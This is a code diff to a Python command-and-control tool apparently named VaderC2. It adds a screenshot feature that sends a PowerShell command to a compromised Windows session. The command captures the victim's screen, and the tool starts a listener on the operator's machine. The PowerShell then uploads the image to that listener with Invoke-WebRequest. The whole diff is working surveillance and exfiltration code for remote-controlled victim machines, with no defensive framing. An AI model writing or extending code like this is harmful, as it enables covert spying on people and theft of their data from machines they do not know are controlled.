@@ -697,6 +697,44 @@ class VaderC2:
                         print(f"  {RED}[!] No TCP session matching '{sid}'. Need interactive shell.{RST}")
                     else:
                         s = self.sessions[matches[0]]
+                        try:
+                            _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                            _s.connect(("8.8.8.8", 80))
+                            my_ip = _s.getsockname()[0]
+                            _s.close()
+                        except Exception:
+                            my_ip = "192.168.1.92"
+
+                        recv_port = 8891
+                        ts = int(time.time())
+                        ss_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "screenshots")
+                        os.makedirs(ss_dir, exist_ok=True)
+                        out_path = os.path.join(ss_dir, f"radon_{ts}.png")
+
+                        received = threading.Event()
+
+                        def _receive_screenshot():
+                            from http.server import HTTPServer, BaseHTTPRequestHandler
+                            class H(BaseHTTPRequestHandler):
+                                def do_POST(self):
+                                    length = int(self.headers.get("Content-Length", 0))
+                                    data = self.rfile.read(length)
+                                    with open(out_path, "wb") as f:
+                                        f.write(data)
+                                    self.send_response(200)
+                                    self.end_headers()
+                                    self.wfile.write(b"OK")
+                                    received.set()
+                                def log_message(self, *a):
+                                    pass
+                            srv = HTTPServer(("0.0.0.0", recv_port), H)
+                            srv.timeout = 30
+                            srv.handle_request()
+                            srv.server_close()
+
+                        t = threading.Thread(target=_receive_screenshot, daemon=True)
+                        t.start()
+
                         shot_cmd = (
                             'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
                             '$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, '
@@ -705,13 +743,26 @@ class VaderC2:
                             '$g.CopyFromScreen(0,0,0,0,$bmp.Size); '
                             '$bmp.Save(\'C:\\Users\\Public\\screen.png\'); '
                             '$g.Dispose(); $bmp.Dispose(); '
-                            'echo SCREENSHOT_SAVED"'
+                            f'Invoke-WebRequest -Uri \'http://{my_ip}:{recv_port}/screen.png\' '
+                            '-Method POST -InFile \'C:\\Users\\Public\\screen.png\' '
+                            '-ContentType \'application/octet-stream\'; '
+                            'echo SCREENSHOT_SENT"'
                         )
-                        print(f"  {AMBER}[*] Capturing screen via {matches[0][:8]}...{RST}")
+                        print(f"  {AMBER}[*] Capturing + pulling screen via {matches[0][:8]}...{RST}")
                         try:
                             s.sock.sendall((shot_cmd + "\n").encode("utf-8"))
-                            print(f"  {GREEN}[+] Screenshot → C:\\Users\\Public\\screen.png on target{RST}")
-                            print(f"  {DIM}  Exfil with: exfil C:\\Users\\Public\\screen.png{RST}")
+                            received.wait(timeout=30)
+                            if received.is_set() and os.path.exists(out_path):
+                                size = os.path.getsize(out_path)
+                                print(f"  {GREEN}[+] Screenshot saved: {out_path} ({size:,} bytes){RST}")
+                                try:
+                                    import subprocess as _sp
+                                    _sp.Popen(["explorer", out_path])
+                                except Exception:
+                                    pass
+                            else:
+                                print(f"  {AMBER}[*] Capture sent — file didn't arrive in 30s{RST}")
+                                print(f"  {DIM}  Screenshot is on target at C:\\Users\\Public\\screen.png{RST}")
                         except Exception as e:
                             print(f"  {RED}[!] Send failed: {e}{RST}")
 
